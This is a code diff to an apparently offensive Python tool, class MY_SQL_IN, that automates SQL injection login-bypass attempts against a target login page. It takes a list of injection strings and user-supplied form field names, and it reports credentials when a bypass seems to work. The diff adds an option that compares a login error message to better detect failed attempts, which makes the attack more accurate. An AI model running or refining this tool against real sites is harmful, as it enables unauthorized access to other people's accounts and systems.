@@ -171,8 +171,20 @@ class MY_SQL_IN:
                  response   = request.submit()
                  content    = response.read()
                  passlogin  = response.geturl() 
-                 Get_URL_Content = request.open(passlogin).read()                       
-                 if  Get_URL_Content == Get_Oregnal_URL  :
+                 Get_URL_Content = request.open(passlogin).read()    
+                 if self.args.Error and self.args.Error in str(content):
+                     print(B+'\n[*]'+R+' SLQ Injaction Command    : '+P, command +W)
+                     print(B+'[*]'+R+' Login Page  URL          : '+B, url+W )                    
+                     print(B+'[*]'+R+' Status                   : '+Y+' NOT LOGIN'+W) 
+                     sys.stdout.write('\x1b[1A')
+                     sys.stdout.write('\x1b[2K')  
+                     sys.stdout.write('\x1b[1A')
+                     sys.stdout.write('\x1b[2K') 
+                     sys.stdout.write('\x1b[1A')
+                     sys.stdout.write('\x1b[2K') 
+                     sys.stdout.write('\x1b[1A')
+                     sys.stdout.write('\x1b[2K')
+                 elif Get_URL_Content == Get_Oregnal_URL  :
                      
                      print(B+'\n[*]'+R+' SLQ Injaction Command    : '+P, command +W)
                      print(B+'[*]'+R+' Login Page  URL          : '+B, url+W )                    
@@ -186,7 +198,7 @@ class MY_SQL_IN:
                      sys.stdout.write('\x1b[1A')
                      sys.stdout.write('\x1b[2K')
                     
-                 else: # print('[+] Username['+'{:<6}'.format(self.args.UserForm) +"] :"+f'{ command}')
+                 else: 
                       print(B+'[*] '+'Login URL  : '+R,  passlogin)
                       print(B+'[*] '+'SLQ Injaction Successful  Login ')
                       print(O+'='*30+'\n'+B+'[!] '+R+'Credentials  : - '+O+'\n'+'='* 20+'\n'+W)
@@ -266,14 +278,15 @@ class MY_SQL_IN:
         
         print(B+"")
         parser = argparse.ArgumentParser(description="Usage: [OPtion] [arguments] [ -w ] [arguments]")      
-        parser.add_argument("-u",'--URL'        , action=None    ,help ="target url loign page") 
-        parser.add_argument("-c","--Code"       , action=None   ,required=True,help ="the List of SQL Commands") 
-        parser.add_argument("-UF","--UserForm"  , action=None    ,help =" add name of the HTML Form Login User")
-        parser.add_argument("-PF","--PassForm"  , action=None    ,help ="add name of the HTML Form Login Passord")
-        parser.add_argument("-PI","--PassInput" , action='store_true'    ,help ="use to Post in Password field")
-        parser.add_argument("-UI","--UserInput" , action='store_true'     ,help ="use to Post in user field")
-        parser.add_argument("-U","--user"       , action=None    ,help ="use pecifk user name ")
-        parser.add_argument("-P","--password"   , action=None    ,help ="use pdcifik Passowrd")       
+        parser.add_argument("-u",'--URL'        , action=None                   ,help ="target url loign page") 
+        parser.add_argument("-c","--Code"       , action=None   ,required=True  ,help ="the List of SQL Commands") 
+        parser.add_argument("-UF","--UserForm"  , action=None                   ,help =" add name of the HTML Form Login User")
+        parser.add_argument("-PF","--PassForm"  , action=None                   ,help ="add name of the HTML Form Login Passord")
+        parser.add_argument("-E","--Error"      , action=None                   ,help =" add Error login message to compare it with HTML response ")
+        parser.add_argument("-PI","--PassInput" , action='store_true'           ,help ="use to Post in Password field")
+        parser.add_argument("-UI","--UserInput" , action='store_true'           ,help ="use to Post in user field")
+        parser.add_argument("-U","--user"       , action=None                   ,help ="use pecifk user name ")
+        parser.add_argument("-P","--password"   , action=None                   ,help ="use pdcifik Passowrd")       
         self.args = parser.parse_args()  
         print(W+"")
         if len(sys.argv)!=1 :
